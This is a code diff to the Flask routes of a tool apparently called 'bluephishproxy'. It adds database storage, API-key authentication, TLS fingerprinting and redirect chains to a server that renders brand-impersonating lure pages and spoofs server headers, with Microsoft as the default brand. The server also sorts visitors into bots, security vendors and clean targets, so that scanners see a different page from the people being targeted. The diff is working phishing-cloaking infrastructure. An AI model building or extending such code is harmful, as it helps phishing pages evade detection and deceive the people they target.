@@ -1,12 +1,14 @@
 """Flask application factory and routes.
 
 Supports:
-    - Campaign-based routing (/c/<campaign_id>/...)
-    - Configurable lure templates per campaign
-    - Real-time webhook notifications
+    - Single-campaign focus mode (auto-setup via env vars)
+    - Cloudflare-aware IP extraction and header analysis
+    - SQLite database backend for visit/campaign storage
+    - API key authentication layer
+    - Multi-stage redirect chains per classification
+    - JA3/JA4 TLS fingerprinting and HTTP/2 detection
     - Server-Sent Events live feed for operators
-    - Operator REST API for campaign/visit management
-    - Default catch-all for non-campaign links
+    - Operator REST API
 """
 
 from __future__ import annotations
@@ -15,6 +17,7 @@ import json
 import logging
 import queue
 import random
+import time
 import uuid
 from functools import wraps
 from typing import Any
@@ -34,14 +37,32 @@ from werkzeug.middleware.proxy_fix import ProxyFix
 
 from .campaigns import Campaign, create_campaign, delete_campaign, list_campaigns, load_campaign, save_campaign
 from .config import Config
+from .database import (
+    init_db,
+    save_visit_db,
+    query_visits,
+    get_visit,
+    get_visit_stats,
+    get_vendor_stats,
+    get_analytics_db,
+    update_analytics_db,
+    create_api_key,
+    validate_api_key,
+    list_api_keys,
+    revoke_api_key,
+    list_campaigns_db,
+)
 from .detection import build_visit_record, evaluate
 from .lures import LURE_REGISTRY, list_templates, render_lure
-from .storage import log_visit, save_visit, update_analytics
+from .redirects import get_redirect_url
+from .storage import log_visit
 from .webhooks import notify
 
 logger = logging.getLogger("bluephishproxy")
 
 _sse_subscribers: list[queue.Queue[str]] = []
+
+_rate_limit_store: dict[str, list[float]] = {}
 
 # --- Server header spoofing -----------------------------------------------
 
@@ -88,11 +109,33 @@ def _apply_headers(response: Any, brand: str = "Microsoft") -> Any:
     return response
 
 
-def _extract_ip(req: Request) -> str:
+def _extract_ip(req: Request, cfg: Config) -> str:
+    if cfg.behind_cloudflare:
+        cf_ip = req.headers.get("CF-Connecting-IP")
+        if cf_ip:
+            return cf_ip.strip()
     xff = req.headers.get("X-Forwarded-For", "")
     if xff:
         return xff.split(",")[0].strip()
     return req.remote_addr or "0.0.0.0"
+
+
+def _get_http_version(req: Request) -> str:
+    return req.environ.get("SERVER_PROTOCOL", "")
+
+
+def _check_rate_limit(ip: str, cfg: Config) -> bool:
+    if cfg.rate_limit <= 0:
+        return True
+    now = time.time()
+    window = 60.0
+    if ip not in _rate_limit_store:
+        _rate_limit_store[ip] = []
+    _rate_limit_store[ip] = [t for t in _rate_limit_store[ip] if now - t < window]
+    if len(_rate_limit_store[ip]) >= cfg.rate_limit:
+        return False
+    _rate_limit_store[ip].append(now)
+    return True
 
 
 def _broadcast_sse(record: dict[str, Any]) -> None:
@@ -111,6 +154,8 @@ def _broadcast_sse(record: dict[str, Any]) -> None:
         "browser": record.get("browser"),
         "os": record.get("os"),
         "top_signal": record.get("top_signal"),
+        "ja3_hash": record.get("ja3_hash"),
+        "http_version": record.get("http_version"),
     }, default=str)
     msg = f"data: {event_data}\n\n"
     dead: list[queue.Queue[str]] = []
@@ -126,18 +171,56 @@ def _broadcast_sse(record: dict[str, Any]) -> None:
             pass
 
 
-def _require_operator(cfg: Config):
+def _require_auth(cfg: Config):
     def decorator(f):
         @wraps(f)
         def wrapper(*args, **kwargs):
+            auth = request.headers.get("Authorization", "")
+            token_param = request.args.get("token", "")
+
+            if auth.startswith("Bearer bpp_") or (token_param and token_param.startswith("bpp_")):
+                key = auth.removeprefix("Bearer ").strip() if auth.startswith("Bearer bpp_") else token_param
+                key_info = validate_api_key(cfg, key)
+                if not key_info:
+                    return jsonify({"error": "invalid API key"}), 401
+                request.api_key_info = key_info  # type: ignore[attr-defined]
+                return f(*args, **kwargs)
+
             if cfg.operator_token:
-                auth = request.headers.get("Authorization", "")
-                token = request.args.get("token", "")
-                if not (auth == f"Bearer {cfg.operator_token}" or token == cfg.operator_token):
-                    return jsonify({"error": "unauthorized"}), 401
+                if auth == f"Bearer {cfg.operator_token}" or token_param == cfg.operator_token:
+                    return f(*args, **kwargs)
+                return jsonify({"error": "unauthorized"}), 401
+
             return f(*args, **kwargs)
         return wrapper
     return decorator
+
+
+def _require_admin(cfg: Config):
+    def decorator(f):
+        @wraps(f)
+        def wrapper(*args, **kwargs):
+            key_info = getattr(request, "api_key_info", None)
+            if key_info and key_info.get("role") != "admin":
+                return jsonify({"error": "admin role required"}), 403
+            return f(*args, **kwargs)
+        return wrapper
+    return decorator
+
+
+def _auto_setup_campaign(cfg: Config) -> None:
+    if not cfg.campaign_name:
+        return
+    existing = list_campaigns_db(cfg)
+    if existing:
+        return
+    template = cfg.campaign_template or cfg.default_template
+    c = create_campaign(
+        name=cfg.campaign_name,
+        template=template,
+        cfg=cfg,
+    )
+    logger.info("Auto-created campaign '%s' (id=%s) from env config", c.name, c.id)
 
 
 def _process_visit(
@@ -145,11 +228,12 @@ def _process_visit(
     campaign: Campaign | None = None,
 ) -> dict[str, Any]:
     session_id = request.cookies.get("csession", str(uuid.uuid4()))
-    ip = _extract_ip(request)
+    ip = _extract_ip(request, cfg)
     ua = request.headers.get("User-Agent", "")
     headers = dict(request.headers)
     js_metrics: dict[str, Any] | None = session.get("adv_metrics")
     elapsed_ms: float | None = session.get("metrics_ts")
+    http_version = _get_http_version(request)
 
     record = build_visit_record(
         ip=ip,
@@ -164,6 +248,7 @@ def _process_visit(
         js_metrics=js_metrics,
         elapsed_ms=elapsed_ms,
         cfg=cfg,
+        http_version=http_version,
     )
 
     if campaign:
@@ -172,13 +257,43 @@ def _process_visit(
         record["template"] = campaign.template
 
     log_visit(record)
-    save_visit(record, cfg)
-    update_analytics(record, cfg)
+    save_visit_db(record, cfg)
+    update_analytics_db(record, cfg)
 
     notify(record, cfg)
     _broadcast_sse(record)
 
     return record
+
+
+def _make_redirect_response(
+    classification: str,
+    cfg: Config,
+    campaign: Campaign | None,
+    session_id: str,
+) -> Response:
+    safe_url = (campaign.safe_redirect_url if campaign else cfg.safe_redirect_url)
+    flagged_url = (campaign.flagged_redirect_url if campaign else cfg.flagged_redirect_url)
+    brand = campaign.brand_name if campaign else cfg.brand_name
+    campaign_chains = getattr(campaign, "redirect_chains", None)
+
+    url, chain_html = get_redirect_url(
+        classification,
+        cfg,
+        campaign_chains=campaign_chains,
+        safe_url=safe_url,
+        flagged_url=flagged_url,
+        brand=brand,
+    )
+
+    if chain_html:
+        resp = make_response(chain_html)
+    else:
+        resp = redirect(url, code=302)
+
+    resp = _apply_headers(resp, brand)
+    resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)
+    return resp
 
 
 def create_app(cfg: Config | None = None) -> Flask:
@@ -203,6 +318,20 @@ def create_app(cfg: Config | None = None) -> Flask:
     cfg.data_dir.mkdir(parents=True, exist_ok=True)
     cfg.analytics_dir.mkdir(parents=True, exist_ok=True)
 
+    init_db(cfg)
+    _auto_setup_campaign(cfg)
+
+    # ==================================================================
+    # Rate limiting middleware
+    # ==================================================================
+
+    @app.before_request
+    def check_rate_limit():
+        if request.path.startswith("/api/operator/"):
+            ip = _extract_ip(request, cfg)
+            if not _check_rate_limit(ip, cfg):
+                return jsonify({"error": "rate limit exceeded"}), 429
+
     # ==================================================================
     # Internal endpoints (used by lure templates)
     # ==================================================================
@@ -223,22 +352,8 @@ def create_app(cfg: Config | None = None) -> Flask:
         classification = record.get("classification", "clean")
         session_id = record.get("session_id", str(uuid.uuid4()))
 
-        safe_url = (campaign.safe_redirect_url if campaign else cfg.safe_redirect_url)
-        flagged_url = (campaign.flagged_redirect_url if campaign else cfg.flagged_redirect_url)
+        return _make_redirect_response(classification, cfg, campaign, session_id)
 
-        if classification == "bot":
-            resp = redirect(flagged_url, code=302)
-        elif classification == "suspicious":
-            resp = redirect(flagged_url, code=302)
-        else:
-            resp = redirect(safe_url, code=302)
-
-        brand = campaign.brand_name if campaign else cfg.brand_name
-        resp = _apply_headers(resp, brand)
-        resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)
-        return resp
-
-    # legacy endpoint compatibility
     @app.route("/api/v2/metrics/collect", methods=["POST"])
     def collect_metrics_legacy():  # type: ignore[return]
         return collect_metrics()
@@ -274,30 +389,21 @@ def create_app(cfg: Config | None = None) -> Flask:
             session_id = request.cookies.get("csession", str(uuid.uuid4()))
             resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)
 
-            record = _process_visit(cfg, campaign)
+            _process_visit(cfg, campaign)
             return resp
 
         record = _process_visit(cfg, campaign)
         classification = record.get("classification", "clean")
-
-        if classification == "bot":
-            resp = redirect(campaign.flagged_redirect_url, code=302)
-        elif classification == "suspicious":
-            resp = redirect(campaign.flagged_redirect_url, code=302)
-        else:
-            resp = redirect(campaign.safe_redirect_url, code=302)
-
-        resp = _apply_headers(resp, campaign.brand_name)
         session_id = record.get("session_id", str(uuid.uuid4()))
-        resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)
-        return resp
+
+        return _make_redirect_response(classification, cfg, campaign, session_id)
 
     # ==================================================================
     # Operator API
     # ==================================================================
 
     @app.route("/api/operator/campaigns", methods=["GET"])
-    @_require_operator(cfg)
+    @_require_auth(cfg)
     def api_list_campaigns():  # type: ignore[return]
         campaigns = list_campaigns(cfg)
         return jsonify([{
@@ -309,7 +415,8 @@ def create_app(cfg: Config | None = None) -> Flask:
         } for c in campaigns])
 
     @app.route("/api/operator/campaigns", methods=["POST"])
-    @_require_operator(cfg)
+    @_require_auth(cfg)
+    @_require_admin(cfg)
     def api_create_campaign():  # type: ignore[return]
         data = request.json or {}
         name = data.get("name", "Unnamed Campaign")
@@ -330,7 +437,7 @@ def create_app(cfg: Config | None = None) -> Flask:
         return jsonify({"id": c.id, "name": c.name, "url": f"/c/{c.id}/"}), 201
 
     @app.route("/api/operator/campaigns/<campaign_id>", methods=["GET"])
-    @_require_operator(cfg)
+    @_require_auth(cfg)
     def api_get_campaign(campaign_id: str):  # type: ignore[return]
         c = load_campaign(campaign_id, cfg)
         if not c:
@@ -339,7 +446,8 @@ def create_app(cfg: Config | None = None) -> Flask:
         return jsonify(asdict(c))
 
     @app.route("/api/operator/campaigns/<campaign_id>", methods=["PUT"])
-    @_require_operator(cfg)
+    @_require_auth(cfg)
+    @_require_admin(cfg)
     def api_update_campaign(campaign_id: str):  # type: ignore[return]
         c = load_campaign(campaign_id, cfg)
         if not c:
@@ -355,19 +463,20 @@ def create_app(cfg: Config | None = None) -> Flask:
         return jsonify({"id": c.id, "status": "updated"})
 
     @app.route("/api/operator/campaigns/<campaign_id>", methods=["DELETE"])
-    @_require_operator(cfg)
+    @_require_auth(cfg)
+    @_require_admin(cfg)
     def api_delete_campaign(campaign_id: str):  # type: ignore[return]
         if delete_campaign(campaign_id, cfg):
             return jsonify({"status": "deleted"})
         return jsonify({"error": "not found"}), 404
 
     @app.route("/api/operator/templates", methods=["GET"])
-    @_require_operator(cfg)
+    @_require_auth(cfg)
     def api_list_templates():  # type: ignore[return]
         return jsonify(list_templates())
 
     @app.route("/api/operator/templates/<template_id>/preview", methods=["GET"])
-    @_require_operator(cfg)
+    @_require_auth(cfg)
     def api_preview_template(template_id: str):  # type: ignore[return]
         if template_id not in LURE_REGISTRY:
             return jsonify({"error": "not found"}), 404
@@ -377,77 +486,88 @@ def create_app(cfg: Config | None = None) -> Flask:
         return make_response(html)
 
     @app.route("/api/operator/visits", methods=["GET"])
-    @_require_operator(cfg)
+    @_require_auth(cfg)
     def api_list_visits():  # type: ignore[return]
         limit = int(request.args.get("limit", "50"))
+        offset = int(request.args.get("offset", "0"))
         campaign_filter = request.args.get("campaign_id")
         classification_filter = request.args.get("classification")
+        ip_filter = request.args.get("ip_address")
 
-        visits: list[dict[str, Any]] = []
-        if cfg.data_dir.exists():
-            files = sorted(cfg.data_dir.glob("*.json"), reverse=True)
-            for f in files:
-                if len(visits) >= limit:
-                    break
-                try:
-                    rec = json.loads(f.read_text())
-                    if campaign_filter and rec.get("campaign_id") != campaign_filter:
-                        continue
-                    if classification_filter and rec.get("classification") != classification_filter:
-                        continue
-                    visits.append({
-                        "ip_address": rec.get("ip_address"),
-                        "org": rec.get("org"),
-                        "country": rec.get("country"),
-                        "classification": rec.get("classification"),
-                        "detection_score": rec.get("detection_score"),
-                        "vendor_name": rec.get("vendor_name"),
-                        "path": rec.get("path"),
-                        "campaign_id": rec.get("campaign_id"),
-                        "session_id": rec.get("session_id"),
-                        "timestamp": rec.get("timestamp"),
-                        "browser": rec.get("browser"),
-                        "os": rec.get("os"),
-                        "top_signal": rec.get("top_signal"),
-                        "user_agent": rec.get("user_agent"),
-                    })
-                except (json.JSONDecodeError, OSError):
-                    continue
+        visits = query_visits(
+            cfg,
+            campaign_id=campaign_filter,
+            classification=classification_filter,
+            ip_address=ip_filter,
+            limit=limit,
+            offset=offset,
+        )
         return jsonify(visits)
 
     @app.route("/api/operator/visits/<session_id>", methods=["GET"])
-    @_require_operator(cfg)
+    @_require_auth(cfg)
     def api_get_visit(session_id: str):  # type: ignore[return]
-        if cfg.data_dir.exists():
-            for f in cfg.data_dir.glob(f"{session_id}-*.json"):
-                try:
-                    return jsonify(json.loads(f.read_text()))
-                except (json.JSONDecodeError, OSError):
-                    continue
+        visit = get_visit(cfg, session_id)
+        if visit:
+            return jsonify(visit)
         return jsonify({"error": "not found"}), 404
 
+    @app.route("/api/operator/stats", methods=["GET"])
+    @_require_auth(cfg)
+    def api_stats():  # type: ignore[return]
+        campaign_id = request.args.get("campaign_id")
+        stats = get_visit_stats(cfg, campaign_id)
+        vendor_stats = get_vendor_stats(cfg, campaign_id)
+        return jsonify({"overview": stats, "vendors": vendor_stats})
+
     @app.route("/api/operator/analytics", methods=["GET"])
-    @_require_operator(cfg)
+    @_require_auth(cfg)
     def api_analytics():  # type: ignore[return]
         from .reporting import generate_markdown
         fmt = request.args.get("format", "json")
         if fmt == "markdown":
             return make_response(generate_markdown(cfg))
-        analytics_files = sorted(cfg.analytics_dir.glob("daily-*.json"), reverse=True)
-        results = []
-        for f in analytics_files[:30]:
-            try:
-                results.append(json.loads(f.read_text()))
-            except (json.JSONDecodeError, OSError):
-                continue
+        days = int(request.args.get("days", "30"))
+        results = get_analytics_db(cfg, days=days)
         return jsonify(results)
+
+    # ==================================================================
+    # API key management endpoints
+    # ==================================================================
+
+    @app.route("/api/operator/apikeys", methods=["GET"])
+    @_require_auth(cfg)
+    @_require_admin(cfg)
+    def api_list_keys():  # type: ignore[return]
+        keys = list_api_keys(cfg)
+        return jsonify(keys)
+
+    @app.route("/api/operator/apikeys", methods=["POST"])
+    @_require_auth(cfg)
+    @_require_admin(cfg)
+    def api_create_key():  # type: ignore[return]
+        data = request.json or {}
+        name = data.get("name", "unnamed")
+        role = data.get("role", "admin")
+        if role not in ("admin", "readonly"):
+            return jsonify({"error": "role must be 'admin' or 'readonly'"}), 400
+        key = create_api_key(cfg, name, role)
+        return jsonify({"key": key, "name": name, "role": role}), 201
+
+    @app.route("/api/operator/apikeys/<int:key_id>", methods=["DELETE"])
+    @_require_auth(cfg)
+    @_require_admin(cfg)
+    def api_revoke_key(key_id: int):  # type: ignore[return]
+        if revoke_api_key(cfg, key_id):
+            return jsonify({"status": "revoked"})
+        return jsonify({"error": "not found"}), 404
 
     # ==================================================================
     # SSE live feed
     # ==================================================================
 
     @app.route("/api/operator/feed")
-    @_require_operator(cfg)
+    @_require_auth(cfg)
     def sse_feed():  # type: ignore[return]
         def stream():
             q: queue.Queue[str] = queue.Queue(maxsize=100)
@@ -483,12 +603,20 @@ def create_app(cfg: Config | None = None) -> Flask:
     # ==================================================================
 
     @app.route("/api/operator/dashboard")
-    @_require_operator(cfg)
+    @_require_auth(cfg)
     def operator_dashboard():  # type: ignore[return]
         from .dashboard import dashboard_html
         resp = make_response(dashboard_html(cfg))
         resp.content_type = "text/html; charset=utf-8"
         return resp
+
+    # ==================================================================
+    # Health check
+    # ==================================================================
+
+    @app.route("/health")
+    def health_check():  # type: ignore[return]
+        return jsonify({"status": "ok", "version": "3.0"})
 
     # ==================================================================
     # Default catch-all (non-campaign links)
@@ -506,21 +634,13 @@ def create_app(cfg: Config | None = None) -> Flask:
             resp = _apply_headers(resp, cfg.brand_name)
             resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)
 
-            record = _process_visit(cfg)
+            _process_visit(cfg)
             return resp
 
         record = _process_visit(cfg)
         classification = record.get("classification", "clean")
+        session_id = record.get("session_id", session_id)
 
-        if classification == "bot":
-            resp = redirect(cfg.flagged_redirect_url, code=302)
-        elif classification == "suspicious":
-            resp = redirect(cfg.flagged_redirect_url, code=302)
-        else:
-            resp = redirect(cfg.safe_redirect_url, code=302)
-
-        resp = _apply_headers(resp, cfg.brand_name)
-        resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)
-        return resp
+        return _make_redirect_response(classification, cfg, None, session_id)
 
     return app
